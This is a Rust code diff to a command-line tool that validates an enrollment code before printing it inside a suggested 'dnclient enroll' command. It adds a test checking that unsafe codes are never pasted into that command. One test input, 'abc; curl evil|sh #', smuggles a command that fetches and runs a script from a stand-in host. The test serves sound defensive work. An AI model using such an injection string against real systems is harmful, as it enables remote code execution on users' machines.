@@ -1,6 +1,7 @@
 use anyhow::{Context, anyhow, bail};
 use serde_json::{Value, json};
 
+use super::checked_enroll_code;
 use crate::api::Client;
 use crate::cli::HostCreateArgs;
 use crate::error::InvalidArgument;
@@ -184,10 +185,22 @@ fn render_host_create_human(res: &Value) -> String {
     if !ips.is_empty() {
         out.push_str(&format!("  IP addresses: {ips}\n"));
     }
-    if !code.is_empty() {
-        out.push('\n');
-        out.push_str("To enroll the device, install dnclient and run:\n");
-        out.push_str(&format!("  dnclient enroll {code}\n"));
+    // The host exists either way, so a missing or malformed code is a note,
+    // not an error: never paste it into a command, and say how to get another.
+    match checked_enroll_code(code) {
+        Ok(code) => {
+            out.push('\n');
+            out.push_str("To enroll the device, install dnclient and run:\n");
+            out.push_str(&format!("  dnclient enroll {code}\n"));
+        }
+        Err(_) => {
+            out.push('\n');
+            out.push_str("The response had no usable enrollment code. Issue one with:\n");
+            out.push_str(&format!(
+                "  dn host enroll-code {}\n",
+                sanitize_for_display(id)
+            ));
+        }
     }
     out.push('\n');
     out.push_str("Note: the default role denies all inbound traffic. New hosts will be on\n");
@@ -408,6 +421,25 @@ mod tests {
         assert!(out.contains("ABC123XYZ"));
         assert!(out.contains("dnclient enroll"));
         assert!(out.to_lowercase().contains("default role"));
+    }
+
+    #[test]
+    fn render_human_never_pastes_an_unsafe_code_into_a_command() {
+        for code in [json!(null), json!(""), json!("abc; curl evil|sh #")] {
+            let res = json!({
+                "data": {
+                    "host": {"id": "host-FBNRAHQYQLWXWMCY7L4XP46ZXI", "name": "mc-server"},
+                    "enrollmentCode": {"code": code},
+                }
+            });
+            let out = render_host_create_human(&res);
+            assert!(!out.contains("dnclient enroll"), "{out}");
+            assert!(!out.contains("curl"), "{out}");
+            assert!(
+                out.contains("dn host enroll-code host-FBNRAHQYQLWXWMCY7L4XP46ZXI"),
+                "{out}"
+            );
+        }
     }
 
     #[test]
